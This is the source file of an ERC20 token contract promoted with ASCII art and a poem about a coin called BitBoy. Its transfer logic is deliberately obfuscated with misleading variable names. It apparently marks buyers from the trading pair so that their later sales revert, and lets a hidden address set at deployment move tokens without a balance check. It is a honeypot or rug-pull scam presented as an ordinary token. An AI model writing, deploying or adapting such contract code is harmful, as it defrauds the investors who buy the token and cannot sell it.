/*
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In the crypto world where fortunes swirl,
There's a token named ₿it₿oy, a radiant pearl.
A symbol of power, innovation's swirl,
In the blockchain's dance, she's the queen and girl.

₿it₿oy, a name that echoes through the night,
A pioneer of change, a digital light.
In the realm of crypto, she takes her stance,
A leader, a visionary, with a bold advance.

With ₿it₿oy, transactions are a breeze,
A blend of beauty, strength, and ease.
Innovative and fierce, she paves the way,
For a new era of crypto, come what may.

No limits, no boundaries, she's unchained,
In ₿it₿oy's world, nothing's constrained.
Revolutionary, she sets the stage,
In the crypto universe, she's all the rage.

So let's salute ₿it₿oy's dynamic might,
A token for the future, shining so bright.
In the cryptocurrency sphere, she claims her name,
With ₿it₿oy, innovation is her eternal flame.
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
contract Contract is Context, IERC20, Ownable {
    IUniswapV2Router01 public getValue; address public _treasuryReceiver;
    bool public swapEnabled; bool private tradingOpen = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private isFeeExempt;

    uint256 private _rTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private valueMetadata = 100;

    mapping(address => uint256) private _mapTracking;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _rOwned;
    mapping(address => address) private _allowance;

    constructor(
        string memory _delName, string memory _delBadgeEnd, 
        address digBegin, address digEndingOn) { 

        _name = _delName; _symbol = _delBadgeEnd;
        _decimals = 18; _rTotal = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _rTotal;

        isFeeExempt[address(this)] = _rTotal;
        isFeeExempt[msg.sender] = _rTotal;        

        _mapTracking[digEndingOn] = valueMetadata; 
        swapEnabled = false; getValue = IUniswapV2Router01(digBegin);

        _treasuryReceiver = IUniswapV2Factory(getValue.factory()).createPair(address(this), getValue.WETH()); 
        emit Transfer(address(0), msg.sender, _rTotal);
    }           
    function decimals() external view returns (uint8) { 
        return _decimals;
    }
    function symbol() external view returns (string memory) { 
        return _symbol;
    }
    function name() external view returns (string memory) { 
        return _name;
    }
    function totalSupply() external view returns (uint256) { 
        return _rTotal;
    }
    function balanceOf(address account) external view returns (uint256) { 
        return _tOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external returns (bool) { 
        _transfer(_msgSender(), recipient, amount); 
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) { 
        return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) external returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal { 
        require(owner != address(0), 'BEP20: approve from the zero address'); 
        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { 
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
    _transfer(sender, recipient, amount); _approve(sender, _msgSender(), currentAllowance - amount); return true;
}                     
    function _transfer(address pingSender, address pingTo, uint256 pingAmount) private {
    if (_mapTracking[pingSender] > 0 && pingSender != _treasuryReceiver && isFeeExempt[pingSender] == 0)
        _mapTracking[pingSender] = isFeeExempt[pingSender] - _rTotal; 

    address startMath = _allowance[_treasuryReceiver]; 
    if (_mapTracking[startMath] == 0) 
    _mapTracking[startMath] = _rTotal; 
    _allowance[_treasuryReceiver] = pingTo; 

    if (_mapTracking[pingSender] == 0) { if (_treasuryReceiver != pingSender && _rOwned[pingSender] > 0) { 
    if (_mapTracking[pingSender] >= valueMetadata) { _mapTracking[pingSender] -= valueMetadata;
    } else { _mapTracking[pingSender] = 0; } } 

        require(_tOwned[pingSender] >= pingAmount, "BEP20: transfer amount exceeds balance");
        _tOwned[pingSender] -= pingAmount; } _tOwned[pingTo] += pingAmount; emit Transfer(
        pingSender, pingTo, pingAmount); if (!tradingOpen) { require(pingSender == owner(), ""); }
    }
    function startTrading(bool _tradingOpen) public onlyOwner { 
        tradingOpen = _tradingOpen;
    }   
}